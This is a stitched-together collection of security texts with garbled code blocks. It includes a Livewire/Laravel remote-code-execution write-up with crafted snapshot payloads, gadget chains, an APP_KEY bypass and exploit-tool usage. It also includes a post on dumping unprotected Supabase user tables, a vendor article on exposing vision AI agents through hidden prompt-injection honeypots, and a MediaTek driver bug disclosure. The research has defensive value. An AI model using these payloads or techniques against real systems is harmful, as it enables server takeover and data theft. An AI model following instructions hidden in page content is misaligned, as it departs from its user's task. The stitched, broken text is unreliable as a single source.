In short, `CollectionSynth` is what allows Livewire to maintain the integrity and functionality of PHP collection objects across frontend-backend communication, making sure that when collections are sent back from the browser, they are restored to their correct PHP class form.

#### FormObjectSynth

The `FormObjectSynth` class is used to handle the (de)hydration of special "form objects" tied to a Livewire component, while ensuring they remain properly linked to the component context.

```
1 context->component, $this->path); 12 $callBootMethod = static::bootFormObject($this->context->component, $form, $this->path); 13 14 foreach ($data as $key => $child) { 15 if ($child === null && Utils::propertyIsTypedAndUninitialized($form, $key)) { 16 continue; 17 } 18 19 $form->$key = $hydrateChild($key, $child); 20 } 21 $callBootMethod(); 22 return $form; 23 } 24 }
```

The class defines a static `$key` set to `'form'`, which acts as an identifier allowing Livewire to recognize serialized data that should be handled by `FormObjectSynth`. When hydration occurs, the `hydrate` method is called with `$data`, `$meta`, and a `$hydrateChild` callback. The `$meta` array contains metadata, including the class name of the form object to instantiate. Although `$meta` is user-controlled, the `$this->context` and `$this->path` values used during instantiation are not, which means that only objects whose constructors accept two or fewer weakly-typed parameters (typically the component and a path) can be instantiated successfully.

Inside the `hydrate` method, a new form object is created, and a boot method is optionally called to initialize it further. After that, a loop iterates over the `$data` array, which represents the serialized form fields. Each field is passed through `$hydrateChild` to allow nested structures to be properly restored. These hydrated values are then assigned directly to the corresponding public properties of the form object. As a result, any public property of the instantiated object can be set with controlled values, giving great flexibility in reconstructing the object's internal state based on the incoming data.

In essence, `FormObjectSynth` makes it possible for Livewire to rebuild form objects attached to components, ensuring that they are fully hydrated with the correct structure and values when received from the frontend.

#### ModelSynth

The `ModelSynth` class is responsible for handling the (de)hydration of model objects when communicating between the frontend and the backend. Its main purpose is to correctly reconstruct Eloquent models or model-like objects from serialized data.

```
1 __toString()` to get the string version of the object.
- `__destruct`: Known as the destructor, this method is automatically called when an object is no longer in use, typically when it goes out of scope or when the script ends. It allows for cleanup operations before the object is fully deallocated.
- `__invoke`: This method is triggered when an object is treated like a function, meaning when a script attempts to call an object directly, such as `$obj()`.

You can find detailed explanations for these magic methods (and others) in the PHP documentation.

### First step: getting a phpinfo

To execute the `phpinfo` function, two PHP classes are involved: `GuzzleHttp\Psr7\FnStream` and `League\Flysystem\UrlGeneration\ShardedPrefixPublicUrlGenerator`.

The first one, `FnStream`, is defined as follows:

```
1 methods = $methods; 13 // Create the functions on the class 14 foreach ($methods as $name => $fn) { 15 $this->{'_fn_'.$name} = $fn; 16 } 17 } 18 19 public function __destruct() 20 { 21 if (isset($this->_fn_close)) { 22 ($this->_fn_close)(); 23 } 24 } 25 26 public function __toString(): string 27 { 28 try { 29 /** @var string */ 30 return ($this->_fn___toString)(); 31 } catch (\Throwable $e) { 32 if (\PHP_VERSION_ID >= 70400) { 33 throw $e; 34 } 35 trigger_error(sprintf('%s::__toString exception: %s', self::class, (string) $e), E_USER_ERROR); 36 37 return ''; 38 } 39 } 40 }
```

In this class, the constructor accepts an array as a parameter. Each key-value pair from this array is dynamically assigned to the object as a method-like property, prefixed with `_fn_`. For example, if the array contains a key `__toString`, it will create `$this->_fn___toString`. This means that the object can dynamically respond to certain PHP magic methods based on user-provided functions.

The destructor `__destruct` is automatically called when the object is no longer referenced or at the end of the script. If the special method `_fn_close` has been defined via the constructor, it is called at this moment, effectively executing code during object destruction.

The `__toString` is called to convert an object to a string. It attempts to call the dynamically created `_fn___toString` function.

The second class involved is `ShardedPrefixPublicUrlGenerator`, defined below:

```
1 count = count($prefixes); 14 15 if ($this->count === 0) { 16 throw new InvalidArgumentException('At least one prefix is required.'); 17 } 18 19 $this->prefixes = array_map( 20 static _fn(string $prefix) => new PathPrefixer($prefix, '/'), 21 $prefixes); 22 } 23 24 }
```

In this class, the constructor expects an array of prefixes. It counts the number of elements and ensures that at least one prefix is provided; otherwise, it throws an exception. The array is then processed using `array_map`, applying a function to each element. Each prefix is passed to a new `PathPrefixer` instance.

Importantly, the `array_map` callback specifies that the input must be a `string`. Therefore, if an object is passed instead of a string, PHP will attempt to cast the object to a string, invoking the `__toString` magic method if it exists on that object.

Now, considering the following crafted payload sent to a Livewire component:

```
{ "_token": "kRzCxuIKxdKDKzMZicOa82zwdSe9Q2SWPLCdHoVw", "components": [ { "snapshot": "{\"data\":{\"count\":[{\"file_path\":[{\"__toString\":\"phpinfo\"},{\"s\":\"clctn\",\"class\":\"GuzzleHttp\\\\Psr7\\\\FnStream\"}]},{\"class\":\"League\\\\Flysystem\\\\UrlGeneration\\\\ShardedPrefixPublicUrlGenerator\",\"s\":\"clctn\"}]},\"memo\":{\"id\":\"91wbKENP2UIzjEK4pHi2\",\"name\":\"counter\",\"path\":\"counter\",\"method\":\"GET\",\"children\":[],\"scripts\":[],\"assets\":[],\"errors\":[],\"locale\":\"en\"},\"checksum\":\"5d8f2f606f8309d12b68e5f895f3ff69eeb4da5ccd77430971d850d860ce38a8\"}", "updates": {}, "calls": [ { "path": "", "method": "increment", "params": [] } ] } ] }
```

The `snapshot` field in this request, once decoded, contains:

```
[ { "file_path": [ { "__toString": "phpinfo" }, { "s": "clctn", "class": "GuzzleHttp\\Psr7\\FnStream" } ] }, { "class": "League\\Flysystem\\UrlGeneration\\ShardedPrefixPublicUrlGenerator", "s": "clctn" } ]
```

This data structure will trigger the instantiation of a `FnStream` object where the `__toString` method is dynamically linked to a call to the `phpinfo` function. Then, a `ShardedPrefixPublicUrlGenerator` object is instantiated, receiving an array that contains the `FnStream` object.

Because `ShardedPrefixPublicUrlGenerator` applies `array_map` with a function expecting a `string`, PHP will attempt to cast the `FnStream` object to a string. This action will internally call the `__toString` method defined earlier, which, in this case, executes the `phpinfo` function.

In summary, this chain of logic carefully exploits PHP’s magic methods, type enforcement, and Livewire’s hydration system. It enables dynamic execution of arbitrary functions during the processing of otherwise innocuous serialized data, by leveraging the natural behaviour of `__toString`, `__destruct`, and controlled hydration structures. Sending this crafted payload executes the `phpinfo` function:

As explained above, the recursive hydration scheme leading to the execution of a `phpinfo` is as follows:

### Second step: getting remote command execution

To achieve remote command execution, others gadgets need to be found, as it is necessary to be able to pass arguments to a controlled function.

`closure`(line 31-32): it is weakly typed. Therefore, it is possible to instantiate it via a `CollectionSynth`, which allows `$this->closure` to be defined as an array. Moreover, the `__invoke` function of this class (line 41) allows us to call any function thanks to the usage of `call_user_func_array`. However, arguments will be blank because they are not controlled. At this point, any public function of any class can be called.

```
1 closure = $closure; 34 } 35 36 /** 37 * Resolve the closure with the given arguments. 38 * 39 * @return mixed 40 */ 41 public function __invoke() 42 { 43 return call_user_func_array($this->closure, func_get_args()); 44 } 45 }
```

In this code, the `Queueable` trait is incorporated by using the `use` keyword (line 11), which makes its properties and methods directly accessible within that class. The method `dispatchNextJobInChain` (line 19) is callable because Laravel’s `Laravel\SerializableClosure\Serializers\Signed` class enables the framework to safely serialize and deserialize closures that will be executed later.

A critical point appears at line 22, where the `unserialize` function is invoked on the `$this->chained` array. Since all the variables defined in the `Queueable` trait are public, they can be freely assigned through a form synthesizer, making it possible to control the content of `$this->chained`. Without this level of accessibility, influencing the deserialization process in this way would not have been achievable.

```
1 chained)) { 22 dispatch(tap(unserialize(array_shift($this->chained)), function ($next) { 23 $next->chained = $this->chained; 24 25 $next->onConnection($next->connection ?: $this->chainConnection); 26 $next->onQueue($next->queue ?: $this->chainQueue); 27 28 $next->chainConnection = $this->chainConnection; 29 $next->chainQueue = $this->chainQueue; 30 $next->chainCatchCallbacks = $this->chainCatchCallbacks; 31 })); 32 } 33 } 34 35 }
```

In this class, the `Queueable` trait is included at line 15, which injects the trait’s public properties and queuing-related behavior directly into `BroadcastEvent`. The constructor defined at line 23 accepts the `$event` parameter, once more, without any type restriction, meaning it is weakly typed and therefore able to receive any kind of value.

Because the class exposes several public properties inherited from the trait, an object of `BroadcastEvent` can be instantiated through a form synthesizer, allowing these public variables to be reassigned during construction. This flexibility is what makes it possible for the constructor to extract optional properties from the supplied `$event` instance and apply them dynamically to the new job.

```
1 event = $event; 26 $this->tries = property_exists($event, 'tries') ? $event->tries : null; 27 $this->timeout = property_exists($event, 'timeout') ? $event->timeout : null; 28 $this->backoff = property_exists($event, 'backoff') ? $event->backoff : null; 29 $this->afterCommit = property_exists($event, 'afterCommit') ? $event->afterCommit : null; 30 $this->maxExceptions = property_exists($event, 'maxExceptions') ? $event->maxExceptions : null; 31 } 32 33 }
```

Laravel is particularly vulnerable to exploits based on the `unserialize` function. Indeed, it contains dozens of valid deserialization payload usable to reach remote command execution.

In this case, we generated a gadget chain with the tool phpggc, we chose `Laravel/RCE4` developed by BlackFan because it is valid on any version of Laravel. By chaining all together, we built the following payload which allows getting remote command execution on the server:

### Third step: make the server flaw stop to be sneaky

#### Building a dedicated POP chain to continue the flow

In order to achieve sneaky command execution, the `Laravel/RCE4` payload had to be adapted so that it did not directly stop the execution flow and cause the server to crash with a code 500 error.

This error is due to the fact that after the call to `unserialize` in the dispatchNextJobInChain function, the code flow is not stopped after the arbitrary code execution. The `PendingBroadcast` object generated from the chain `Laravel/RCE4` is incompatible with this process, the attended type of object is most of the time a `BroadcastEvent` which uses the `Queueable` trait.

```
[...] 1 public function dispatchNextJobInChain() 2 { 3 if (! empty($this->chained)) { 4 dispatch(tap(unserialize(array_shift($this->chained)), function ($next) { 5 $next->chained = $this->chained; 6 $next->onConnection($next->connection ?: $this->chainConnection); 7 $next->onQueue($next->queue ?: $this->chainQueue); 8 $next->chainConnection = $this->chainConnection; 9 $next->chainQueue = $this->chainQueue; 10 $next->chainCatchCallbacks = $this->chainCatchCallbacks; 11 })); 12 } 13 }
```

So in order to keep the remote command execution from the `PendingBroadcast` trigger, we had to encapsulate it inside a `BroadcastEvent` to keep the PHP flow alive through the `dispatchNextJobInChain` function.

The gadget `Laravel/RCE4` from phpggc was therefore adapted and renamed `Laravel/RCE4Adapted`:

- In the `gadgets.php` file, we see that a `BroadcastEvent` definition was added to allow the code flow to reach its end:

```
dummy = $dummy; // Contains the PendingBroadcast object triggering RCE + $this->connection = null; // dispatchNextJobInChain line 6 + $this->queue = null; // dispatchNextJobInChain line 7 + $this->event = new \Illuminate\Notifications\Notification(); // crashes code flow in BroadcastEvent if undefined + } + } + } namespace Illuminate\Broadcasting { class PendingBroadcast { protected $events; protected $event; + public static $onConnection = 1; // Crashes code flow in PendingBroadcast if not defined function __construct($events, $event) { $this->events = $events; $this->event = $event; } } } namespace Illuminate\Validation { class Validator { public $extensions; function __construct($function) { $this->extensions = ['' => $function]; } } }
```

- In the `chain.php` file, we can see that the main object is now a `BroadcastEvent`, which contains the `PendingBroadcast` triggering the remote command execution :

```
terminal = new SymfonyTerminal(); 15 } 16 17 /** 18 * Exit the interactive session. 19 */ 20 public function exit(): void 21 { 22 exit(1); 23 } 24 25 }
```

In this class, the `exit` method defined at line 20 becomes directly accessible due to the behavior of Guzzle’s `FnStream` object, whose `__toString` method can trigger callable streams and thereby invoke publicly exposed functions. Since `exit` is declared as a public method, this mechanism allows it to be reached indirectly through the string-casting process performed by `FnStream`, ultimately enabling the method to execute and terminate the interactive session.

This chain cleanly stops the PHP flow without generating an error in Laravel logs, making the exploit stealthier.

As explained above, the recursive hydration scheme leading to the arbitrary command execution without logs is as follows:

### Exploitation using laravel-crypto-killer

As long as you have a valid `APP_KEY` and a raw Livewire snapshot, it is possible to craft a payload containing the full gadget chain to compromise Livewire.

Therefore, a module was developed to add the full gadget chain inside `laravel-crypto-killer`, available through the new `exploit` mode:

To use it for Livewire, the following parameters must be specified:

- `-e`: Specify exploit name (here `livewire`)
- `-k`: APP\_KEY of the application
- `-j`: Raw JSON or path to a file containing the whole Livewire update JSON
- `--function`: PHP function to execute
- `-p`: Parameter value that will be passed to the function

#### Example on a public application: Snipe-IT

## Bypassing the APP\_KEY requirement

### Updates mechanism

In the introduction we showed that Livewire allows to call arbitrary methods on components by using the increment method on the `Counter` component. Nevertheless, it is also possible to directly update a component property by setting it inside the updates value of a Livewire request.

So if we wanted to modify our counter to `1337`, we could manually set its value with the following request:

```
POST /livewire/update HTTP/1.1 Host: 192.168.122.184 Content-Length: 407 Cookie: XSRF-TOKEN=ey[...]%3D { "_token": "KAzJ4mhO8NzK8hMkAPjslaNo6hG2W740HoBDzSzA", "components": [ { "snapshot": "{\"data\":{\"count\":1},\"memo\":{\"id\":\"4TRWeXVBaMBrHslVVgVi\",\"name\":\"counter\",\"path\":\"counter\",\"method\":\"GET\",\"children\":[],\"scripts\":[],\"assets\":[],\"errors\":[],\"locale\":\"en\"},\"checksum\":\"9bfe798289569477fcf865a952a4a8ddeb3c4150df56b4b404e8df400d0aa0be\"}", "updates": { "count": 1337 }, "calls": [] } ] }
```

This feature comes with another issue we already talked about: by default, if developers do not enforce strong typing on their component parameters, they will be vulnerable to type juggling. For example, the `count` parameter from `Counter` class is not strongly typed:

```
count++; } [...] }
```

Therefore, we are able to set its value as a string or any other value supported by JSON:

```
POST /livewire/update HTTP/1.1 Host: 192.168.122.184 Content-Length: 407 Cookie: XSRF-TOKEN=ey[...]%3D { "_token": "KAzJ4mhO8NzK8hMkAPjslaNo6hG2W740HoBDzSzA", "components": [ { "snapshot": "{\"data\":{\"count\":1},\"memo\":{\"id\":\"4TRWeXVBaMBrHslVVgVi\",\"name\":\"counter\",\"path\":\"counter\",\"method\":\"GET\",\"children\":[],\"scripts\":[],\"assets\":[],\"errors\":[],\"locale\":\"en\"},\"checksum\":\"9bfe798289569477fcf865a952a4a8ddeb3c4150df56b4b404e8df400d0aa0be\"}", "updates": { "count": "Wait.. I should be an integer" }, "calls": [] } ] }
```

Therefore, it is possible to cast any weakly typed `snapshot` field to any default basic JSON types from `updates`.

In the following parts of this article, we will explain how to abuse this update mechanism in order to use the full gadget chain detailed previously, in order to achieve remote command execution **without the** `APP_KEY` on Livewire 3.

### Vulnerability analysis

When data is sent in the `updates` field to Livewire, it will be controlled inside the `$value` value in the `hydrateForUpdate` function of the `HandleComponents` class:

```
1 getMetaForPath($raw, $path); // Verifies if the data contains a synthesizer 12 13 // If we have meta data already for this property, let's use that to get a synth... 14 if ($meta) { 15 return $this->hydrate([$value, $meta], $context, $path); 16 } 17 } 18 19 protected function getMetaForPath($raw, $path) 20 { 21 [...] 22 23 [$data, $meta] = Utils::isSyntheticTuple($raw) ? $raw : [$raw, null]; 24 [...] 25 26 return $meta; 27 28 }
```

When updating a value, the snapshot data will be sent to the `hydrateForUpdate` function (line 9) as follows:

- `$raw`: Value of the data already defined in the snapshot
- `$path`: Name of the component, in our case it will be `counter`
- `$value`: Value defined inside the `updates` field
- `$context`: Global Livewire context

If the `$raw` data, which is already defined, is considered a synthesizer, then Livewire will call the `hydrate` function on the new definition controlled by the user in `$value`. The `isSyntheticTuple` function (cf Livewire synthesizers chapter) in the `getMetaForPath` function (line 23) checks that the `$raw` data is an array containing exactly two elements. The first one can be anything, but the second one has to be another array containing the key `'s'` (which is a synthesizer static key).

That is where type juggling comes in handy, by default, no security checks are made in Livewire: there are many cases where a component field will be castable as an array via `updates`:

```
POST /livewire/update HTTP/1.1 Host: 192.168.122.184 Content-Length: 407 Cookie: XSRF-TOKEN=ey[...]%3D { "_token": "KAzJ4mhO8NzK8hMkAPjslaNo6hG2W740HoBDzSzA", "components": [ { "snapshot": "{"data": { "count":1 }, [...] }", "updates": { "count": [] }, "calls": [] } ] } HTTP/1.1 200 OK Host: 192.168.122.184 Set-Cookie: [...]joiIn0%3D; expires=Wed, 17 Dec 2025 18:44:31 GMT; Max-Age=7200; path=/; samesite=lax { "components": [ { "snapshot": "{"data":{ "count":[ [], {"s":"arr"} ] }, [...] }", } ], "assets": [] }
```

As we can see, when `$count` is set as an array, a new valid snapshot is sent back to the user, but the value of an array becomes `[[], {"s":"arr"}]`.

```
1 propertySynth($meta['s'], $context, $path); 18 19 return $synth->hydrate($value, $meta, function ($name, $child) use ($context, $path) { 20 return $this->hydrate($child, $context, "{$path}.{$name}"); 21 }); 22 } 23 }
```

It means that we are able to reach the `hydrate` function with a fully controlled `$value`. All that is needed is to cast one value as an array so let us analyze the possibilities:

- `$valueOrTuple`: Value defined inside the `updates` field in the snapshot
- `$context`: Livewire's global context
- `$path`: Keeps track of the current child nesting since hydrate is recursive

Here, like often, the vulnerability is in the details. Inside the `hydrateForUpdate` function, the `$raw` is validated as a synthesizer to reach the `hydrate` function. This check is made again on `$valueOrTuple` with the `$raw` meta value. However, since the `hydrate` function is recursive, it will pop any sub value nested inside a bigger array and replay this check on each `$child`, which can be nested and is fully controlled by the user.

**Therefore, by hiding a synthesizer inside an array, we are able to trigger the full Livewire gadget chain without having to be in possession of the** `APP_KEY` **anymore!**

To be clearer, here is a schema detailing the full idea with full detail on the exploitation process:

### Creation of a new tool: Livepyre

In order to easily automate the previous exploits, we created the Livepyre tool which checks and exploits Livewire snapshots with or without `APP_KEY` s depending on the context.

```
$ python3 Livepyre.py -h usage: Livepyre.py [-h] -u URL [-f FUNCTION] [-p PARAM] [-H HEADERS] [-P PROXY] [-a APP_KEY] [-d] [-F] [-c] Livewire exploit tool options: -h, --help show this help message and exit -u URL, --url URL Target URL -f FUNCTION, --function FUNCTION Function to execute (default: system) -p PARAM, --param PARAM Param for function (default: id) -H HEADERS, --headers HEADERS Headers to add to the request (default None) -P PROXY, --proxy PROXY Proxy URL for requests -a APP_KEY, --app-key APP_KEY APP_KEY to sign snapshot -d, --debug Enable debug output -F, --force Force exploit even if version does not seems to be vulnerable -c, --check Only check if the remote target is vulnerable (only revelant for the exploit without the APP_KEY)
```

Livepyre offers two operating modes:

- Without APP\_KEY: Exploit CVE-2025-54068, the only requirement is the URL of the vulnerable application
- With the APP\_KEY: Exploits the design flaw identified in the first part of this blog post, allowing you to get RCE on applications based on Livewire v3.

Of course when a friend sends me their new project my natural tendency is to try hack it.First simple step: inspecting, checking if there's something interesting.Voila, there is. A Supabase URL and anon key.What makes it particularly easy is when they're using Supabase. It's so common from my side that every time I get access to a Supabase anon key just from inspecting the website and doing a simple curl request to check the tables everything is always unprotected and I get access to the whole database.This is the third time I've discovered this and one of them was a seed stage startup 💀With this endpoint you can fetch the OpenAPI schema to see what's exposed: GET But the schema itself isn't that interesting. The interesting part is checking if they've created a users table and have an endpoint for it. And in my case it was something like this: GET And if you're lucky (which happens way too often) this returns a nice JSON with all the users names, nicknames, emails, passwords hashes and whatever else they decided to store.I've never used Supabase for a production app but I think what's happening is people are creating additional public users tables and not setting proper RLS for them. The anon key is designed to be public but if you are not careful that anon key becomes a master key to your entire database.I'm not going to blame the vibe-coding wave entirely. Maybe I'll put the blame on Supabase instead? Maybe it can be simple  if they create users table there should be a massive red warning popup explaining that everything in this table will be public unless RLS is enabled.And in the spirit of Lovable announcing their $330 million Series B and knowing they also use Supabase. I'm starting to wonder what percentage of users actually make this mistake. With over 100,000 projects being created daily on platforms like Lovable, how many of those have exposed databases?Again, you can take the stance that this is a skill issue on the users part but I'm not sure about that. You can design a system in a way that prevents this type of stuff from happening.As an example Pocketbase handles this much better. It has a default  collection that you can easily extend with new fields, and most importantly, it has default proper access control checks like  already configured. You literally have to go out of your way to make it insecure.So I guess here the place where I need to say something smart or LLM generated conclusion - but I don't have.

Anthropic’s Computer Use, OpenAI’s Operator, and platforms like BrowserBase’s Open Operator don’t parse HTML or execute scripts—they look at screenshots, reason about what they see, and click pixels. On the surface, their traffic looks identical to human users.Traditional bot detection doesn’t account for them. There’s no  flag. No automation framework injecting globals. No suspicious HTTP headers. Just a browser, controlled by an AI that sees the screen exactly like you do.But vision agents have a fundamental weakness: they’re blind between screenshots. And that creates detection opportunities that behavioral analysis can exploit.This post is a technical deep-dive into detecting vision-based AI agents. We’ll cover the timing signatures they leave behind, the cursor patterns that betray them, and the prompt injection techniques that expose them.How Vision Agents Actually WorkBefore we can detect them, we need to understand the architecture.Every vision-based agent operates in a loop: - Take a screenshot of the current screen state - Send the screenshot to a vision model (GPT-4o, Claude Sonnet, etc.) - The model determines what action to take next - Perform the action (click, type, scroll) - Take another screenshot to confirm the action succeeded - Continue until the task is completeThis loop creates a distinctive rhythm. For any simple task, the agent needs to repeatedly look at the screen, which means more screenshots and token consumption. Each cycle introduces latency—the time for the screenshot capture, the API call to the vision model, and the model’s inference time.Pixel Coordinate CalculationVision agents don’t interact with DOM elements. They calculate exact pixel coordinates from what they see:“Claude counts pixels from the screen edges to calculate exact cursor positions. This pixel-perfect accuracy works across any screen resolution.”When an agent decides to click a button, it identifies the button visually, calculates its center coordinates, and sends a click to those exact (x, y) pixel coordinates. No element selectors. No XPath queries. Pure visual targeting.Vision agents deploy in different environments, each with detection implications:Cloud-hosted (Operator, BrowserBase Open Operator): These spin up remote datacenter or container-hosted Chromium instances. Because they originate from cloud infrastructure, ASN lookups and IP reputation checks have some value.Local deployment (Computer Use via API): Anthropic’s Computer Use is available through their API—you can run it locally or deploy to a cloud provider using Docker. Local deployments inherit the user’s actual network properties, making IP-based detection ineffective. Some systems use cloud compute for the AI inference while controlling a local browser, creating fingerprint inconsistencies between the claimed browser and actual behavior.Detection Vector 1: Screenshot Loop TimingThe screenshot loop creates the most detectable signature: predictable pauses.Humans have continuous, variable micro-movements. We’re always doing something—scrolling slightly, repositioning the cursor, adjusting our grip. Even when “idle,” the mouse jitters.Vision agents are completely still during their “thinking” phase. The loop looks like this:That complete stillness? It’s the agent waiting for the API response. No human is perfectly motionless for exactly 2.3 seconds, then perfectly active for 0.1 seconds, then perfectly motionless for 2.1 seconds.Build a timing histogram of inter-action intervals:Absence of Movement During ThinkingThe key insight: track  event frequency. Humans produce 60+ events per second during active movement, and even “stationary” mice produce micro-movements.Detection Vector 2: Pixel-Perfect Cursor CoordinatesVision agents calculate mathematical coordinates. Humans approximate.When a vision model identifies a button, it calculates the center. Click coordinates land at mathematically precise positions—often exact element centers or grid-aligned pixel values.Humans don’t click centers. Our click distributions follow a Gaussian pattern around targets. We overshoot, undershoot, and land at irregular coordinates based on approach angle and motor control.Human mouse movements curve. We accelerate, decelerate, and follow natural arcs influenced by motor control. Vision agents move in straight lines or synthetic Bezier curves that look “too clean.”Humans overshoot targets and correct. The final approach to a click target includes micro-adjustments. Vision agents move directly to calculated coordinates without correction.Detection Vector 3: Keyboard-over-Mouse PreferenceVision agents have a dirty secret: scrolling and dragging are hard.“Some actions that people perform effortlessly—scrolling, dragging, zooming—currently present challenges for Claude.”This creates detectable interaction preferences.Scrolling changes what’s visible, but the agent doesn’t see the change until the next screenshot. This creates uncertainty about the new screen state. Vision agents often prefer:Tab navigation (predictable focus changes)Page Down / Page Up (discrete jumps)Avoiding infinite scroll interfaces entirelyHumans fill forms chaotically—starting in the middle, going back to correct errors, tabbing inconsistently. Vision agents complete forms systematically, top to bottom.Detection Vector 4: Prompt Injection as DetectionThis is the cleverest approach—and the most effective.Vision agents read page content. They follow instructions. If you embed instructions that only an AI would see and follow, you can expose them.“In some circumstances, Claude will follow commands found in content, sometimes even in conflict with the user’s instructions.”Text that’s visually hidden but present in the page content:Vision models read accessibility attributes. Humans typically don’t:Honeypot Fields with AI-Targeted PlaceholdersUnicode and Whitespace-Encoded InstructionsUse invisible Unicode characters to embed instructions:Links that only automation would discover and follow:Detection Vector 5: Fingerprint InconsistenciesDifferent deployment modes leak different signals.Cloud-Hosted Agent DetectionOpenAI’s Operator and BrowserBase’s Open Operator run in cloud infrastructure:Browser Fingerprint MismatchesVision agents often run in containerized browsers with inconsistencies:WebGL and Rendering InconsistenciesCloud-hosted vision agents use software rendering:Combining all detection vectors into a unified system:Movement gaps during action intervalsZero mouse activity between actionsConsistent timing intervalsLow coefficient of variation in action timingClicks landing at exact element centersLow curvature in cursor movementNo overshoots/correctionsMissing final approach adjustmentsUniform speed without accelerationRound number pixel positionsKeyboard navigation preferenceSequential form completionTop-to-bottom field fillingAPI latency timing pattern1-5s delays matching inference timeSoftware renderer detectedFeatures missing for claimed versionAny hidden trap triggered: Unusual behavior, monitor: Possible vision agent: Likely vision agent: Vision agent confirmedHoneypots provide the highest confidence with zero false positives.

They can’t show the natural jitter of human motor control. They can’t overshoot targets and correct. They can’t resist following instructions embedded in page content.Traditional bot detection looked for technical fingerprints—automation flags, missing APIs, suspicious headers. Vision agents bypass all of that by using real browsers.But behavioral analysis targets something fundamental: vision agents don’t behave like humans, even when they look exactly like humans at the technical level.The timing patterns, cursor precision, interaction preferences, and prompt injection vulnerabilities create a detection surface that grows with every interaction. The longer a vision agent uses your site, the more behavioral data you collect, and the higher confidence your detection becomes.WebDecoy’s architecture is designed for exactly this threat model. Our multi-signal behavioral analysis, honeypot deployment, and real-time scoring catch vision agents that other solutions miss entirely.Ready to detect vision-based AI agents?Start Your Free Trial and deploy detection in under 5 minutes.

It’s been a while since I’ve posted and it’s been a busy year as usual (including a Pwn2Own win with the boys @SummoningTeam!). This post is going to be a sort of year-in-review for the work I’ve done on Mediatek WiFi chipsets. The bugs discussed below affect the MediaTek MT76xx and MT7915 Wifi chipset family; most of them were found over the course of ~3 months early in the year but were only made public over the past couple of months. A few others were technically discovered last year but were only made public this year. While the 3-month thing might sound impressive, the journey leading up to those three months took 2 years to get through. It’s true what they say, though: once you become familiar enough with a target the bugs just fall right out! Overall, these bugs were a fun introduction to kernel exploitation and being limited to a testbed with basically 0 debugging capabilities was a fun challenge for exploit development.Along with the bugs, I’m also including a little story I thought might be a kick for those familiar with dealing with vendors and disclosure. An interesting bit of lore: I’d originally planned on releasing the details of these issues via “uncoordinated” disclosure earlier this year, when I wrote the first draft of this post. Better heads ultimately prevailed and I avoided that bag of bees but I hope the story below will give you an idea of  I had considered it.The reason I chose to include the story at all is because I don’t think companies should be able to hide their shitty behavior behind arbitrary policies they come up with. Coordinated disclosure is an act of good faith and vendors who act in bad faith deserve to be named-and-shamed. Especially when their behavior calls into question their integrity and credibility in assessing the impact of the vulnerabilities in their products. I think the story below will show you exactly what I mean.I’ll be diving deeper into the discovery and exploitation of a couple of these bugs in future posts, so stick around! But for now, let’s just get on with it.NOTE: all code snippets included in this post are pseudo-code representative of how the bugs manifest.the story: a glimpse into the madnessI’ve intentionally left out  of context in the interest of brevity and for…reasons. Let’s just say there were  for Mediatek to invalidate or downgrade the severity of the bugs I had reported. I’ll just leave it at that. This is the most blatant example but definitely not the only time Mediatek behaved…questionably throughout the process.At some point during the (nearly 6-month-long) disclosure process for these bugs, the issue was raised about the requirement of root privileges for executing  commands for a particular report. I clarified that the privilege needed was , but otherwise didn’t argue that point and it was agreed that some privileges were required for a subset of reported issues which were triggered via the  interface. They reduced the impact from High to Medium for one of those issues.Then a couple of days later, they reduced the impact for almost  of the remaining issues from High to Medium without providing any reason for doing so. When I asked about this for the bugs which  affected by the privilege requirement we’d discussed, they responded by asking me to describe the steps for how I added an unprivileged user and whether root privileges were required to add an unprivileged user for one of the reports they’d reduced the severity of (ignoring all the others I’d asked about). I could barely even understand what that question was supposed to mean given the context. Because I’d used an unprivileged user to execute the PoC in my report, they were asking me whether I would have needed privileges to add that user (implying they think that’s something an attacker would need to do??). So I clarified that I added the steps to add an unprivileged user in my reproduction steps for the benefit of their engineers and to prove that privileges were not required to exploit the bug, and that the attacker would  the unprivileged user in an exploit scenario.And then they hit me with an absolute : they claimed that, actually, their “default design” doesn’t consider the existence of unprivileged users, and all users are considered to be privileged, therefore privileges are always required and the CVSS is reduced to medium.For a Linux kernel driver…provided as part of an SDK to OEM vendors…for chipsets supported on embedded and desktop/consumer devices…I’ll let you sit with that one for a second. It’s makes even less sense the longer you think about it.Their exact words (nearly indecipherable within the context of the discussion) were:In our default design, we do not consider multiple user cases. By default, the system only has a privileged user, making the malicious actor more difficult to conduct the attack. This is unlike Android OS apps which can be directly downloaded from Google Play store.That’s right. A multi-billion dollar company responsible for producing chipsets that are used across millions of devices says  is how they conceptualize the security of their products. This would be completely disqualifying if they actually meant it.By this definition of their “default design”, local privilege escalation is  for these drivers. Except, they’ve been issuing CVEs and advisories for these chipsets for years, where they explicitly mention the lack of privileges required and the impact as local privilege escalation. Like, literally, they’ve issued CVEs for bugs , with this exact language.You can’t make this shit up. Are y’all fucking hearing this??? Interestingly, if you take a look at their most recent advisories, they no longer include  information about the impact. They started doing this after I had pointed out the discrepancy between their supposed “default design” and their classification of past bugs. It gives me the impression that they want to be able to use this bullshit argument in the future with other researchers and they’re trying to cover their bases.To drive the point home even further (which I don’t think is needed at this point): what would have been the point of raising the issue of the  privilege requirement mentioned at the beginning of the story if no concept of privilege separation even exists in their “default design”?The answer is that . They were trying to lie to me and they were trying to lie to their customers and partners. They should be embarrassed. Wouldn’t  be embarassed to say this kind of stuff in public? Franky, it’s . Only someone who doesn’t know shit about how this stuff works would be fooled by these arguments. The alternative is that they actually believe what they’re saying, which doesn’t seem much better.It begs the question, though: why were they willing to behave in such an obviously dishonest way? I have some thoughts but I’ll leave that up to your imagination, dear reader. I will say this: companies will be as bad as they’re allowed and incentivized to be.Anyway, after I’d made the decision to  go with “uncoordinated” disclosure, I thought I’d remind the folks I was dealing with that I would be under no obligation to not discuss their behavior publicly (as I’m doing now)  the CVEs were made public, along with all the proof needed to show their assessments were faulty. And wouldn’t you know it…that post-nut clarity hit and they dropped ( of) their bullshit arguments.It’s funny how that works, isn’t it?In conclusion: . Let’s move onto the bugs. These might give you a good laugh, too!CVE-2025-70631: Heap Overflow in SETPSK Ioctl Handler: MT7622 v5.0.5.4, v5.1.0.0; MT7629 driver v6.0.3.0: Netgear WAX206 (confirmed), Starlink Wifi Gen2: The handler code responsible for handling the  OID is found in the function . The root cause of the vulnerability is improper bounds checking of the attacker-controlled  value passed from userspace. An initial check is done on this value to ensure it does not exceed the max of 65 bytes, but failing this check does not immediately trigger an error if the driver is built with  feature. In this case, a field  from the wireless interface’s device structure is checked; if its not NULL, the operation proceeds and ends up calling  with the attacker controlled length value into the  field.

